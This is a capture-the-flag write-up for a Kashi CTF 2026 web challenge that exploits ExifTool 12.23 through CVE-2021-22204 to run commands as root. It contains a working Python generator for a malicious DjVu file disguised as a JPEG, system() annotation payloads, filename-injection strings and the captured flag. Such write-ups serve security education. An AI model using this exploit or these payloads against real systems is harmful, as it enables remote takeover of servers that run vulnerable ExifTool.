---
title: "Hidden Secrets"
ctf: "Kashi CTF 2026"
date: "2026-04-03"
description: "RCE via ExifTool CVE-2021-22204"
points: 500
tags: ["Web", "CVE"]
---

## tl;dr

This challenge presents a web app that claims to be a metadata extractor for uploaded images. The description hints that "there's more to it than meets the eye" and that the admins set up a metadata extraction tool to "use it wisely" — a strong signal that the tool itself is the attack surface, not the image contents.

**Challenge points:** 500

---

## Recon

Starting with basic HTTP recon:

```bash
curl -i -s http://34.126.223.46:17158/
```

A single upload form posting to `/`, accepting image types with no obvious extra endpoints. The page text mentioned `EXIF`, `GPS`, and "custom metadata fields carefully," reinforcing that the server was probably invoking something like `exiftool`.

Uploading a minimal valid PNG to observe behavior:

```bash
curl -s -F file=@/tmp/test.png http://34.126.223.46:17158/
```

The response contained raw metadata output with two critical lines:

```
ExifTool Version Number         : 12.23
Directory                       : /tmp/uploads
```

**Two critical facts immediately:**

1. The backend is using **ExifTool**
2. The version is **12.23**

ExifTool versions up to 12.23 are vulnerable to **CVE-2021-22204**, a DjVu parsing bug that allows code execution when ExifTool processes a malicious DjVu annotation.

Filename injection was also tested (e.g. `$(id)`, `;id;`), but those did not execute — the ExifTool version was the real target.

---

## Why CVE-2021-22204 Fits

The vulnerability is in how ExifTool parses DjVu annotation metadata. If you upload a crafted DjVu file, ExifTool evaluates attacker-controlled content. Since the upload form only accepts "image" uploads, the standard trick is to upload a DjVu file with an image extension like `.jpg`.

The malicious annotation format:

```text
(metadata "\c${system('id')};")
```

If the server is vulnerable, ExifTool executes the system command while parsing the file.

---

## Building the Exploit

Generating the malicious file locally with Python:

```python
import struct

def chunk(tag, data):
    out = tag + struct.pack('>I', len(data)) + data
    if len(data) % 2:
        out += b'\x00'
    return out

info       = struct.pack('>HH', 1, 1) + bytes([24, 0, 44, 1, 22, 1])
annotation = b"(metadata \"\\c${system('id');}\")"
body       = b'DJVU' + chunk(b'INFO', info) + chunk(b'ANTa', annotation)
exploit    = b'AT&T' + b'FORM' + struct.pack('>I', len(body)) + body

open('/tmp/exploit.jpg', 'wb').write(exploit)
```

Even though named `.jpg`, `file /tmp/exploit.jpg` identifies it as a DjVu document.

---

## Triggering Code Execution

```bash
curl -s -F 'file=@/tmp/exploit.jpg;filename=proof.jpg' http://34.126.223.46:17158/
```

Response contained:

```
uid=0(root) gid=0(root) groups=0(root)
```

**Full remote code execution as root confirmed.**

---

## Finding the Flag

Used a broad listing payload to locate the flag:

```text
(metadata "\c${system('ls -la / /app /root /home 2>/dev/null')};")
```

Response included:

```
/:
...
-r--r--r--   1 root root   75 Apr  3 11:20 flag.txt
...
```

Flag file is at `/flag.txt`.

---

## Reading the Flag

Rebuilt the payload with `cat /flag.txt`:

```text
(metadata "\c${system('cat /flag.txt')};")
```

Uploaded the same way, and the response contained the flag:

```
kashiCTF{UFeA0VV3wezFVc3kzx7tKuxEERbZAeGuXVfRvWcMix2qHTF9Pd5qaWAtJZpg64FI}
```

---

## Flag

```
kashiCTF{UFeA0VV3wezFVc3kzx7tKuxEERbZAeGuXVfRvWcMix2qHTF9Pd5qaWAtJZpg64FI}
```

---

## What to Learn

- Always do a benign upload first. Version leakage is often enough to identify the exploit path.
- Raw tool output in web responses is dangerous — here it exposed both ExifTool and its exact version.
- When a challenge says "metadata extraction tool," think about the parser, not just the file contents.
- CVE-2021-22204 is a classic example of parser exploitation through a disguised file type.
- When you get RCE, don't guess the flag path immediately. First confirm execution, then enumerate, then read the target.
